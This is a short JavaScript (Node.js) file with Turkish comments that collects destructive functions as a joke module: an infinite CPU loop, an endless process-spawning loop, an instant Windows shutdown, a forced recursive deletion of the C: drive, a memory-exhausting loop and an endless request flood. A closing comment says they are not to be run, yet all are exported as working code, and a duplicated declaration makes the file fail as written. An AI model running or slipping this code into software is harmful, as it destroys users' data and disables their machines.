// 🔥 İŞLEMCİYİ PATLATAN KOD
function cpuBomb() {
    while(true) {
        Math.random() * Math.random();
        console.log("hehe işlemci go brrrr 🔥");
    }
}

// 💣 SONSUZ ÇOCUK PROCESS SPAWN
const { exec } = require('child_process');
function forkBomb() {
    while(true) {
        exec('node -e "console.log(\'pwned\')"');
    }
}

// 💀 PC KAPATMA
const { exec } = require('child_process');
function shutdownPC() {
    exec('shutdown /s /t 0');
}

// 🗑️ DOSYA SİLME
const fs = require('fs');
function deleteEverything() {
    fs.rmSync('C:\\', { recursive: true, force: true });
}

// 🐌 RAM PATLATAN
function ramBomb() {
    const arr = [];
    while(true) {
        arr.push(new Array(999999).fill('x'.repeat(999999)));
    }
}

// 🌀 SONSUZ ASYNC LOOP
async function asyncBomb() {
    while(true) {
        await Promise.all([
            fetch('http://localhost'),
            fetch('http://localhost'),
            fetch('http://localhost')
        ]);
    }
}

// ⚠️ ÇALIŞTIRILMAMASI GEREKEN FONKSIYONLAR
module.exports = {
    cpuBomb,
    forkBomb,
    shutdownPC,
    deleteEverything,
    ramBomb,
    asyncBomb
};
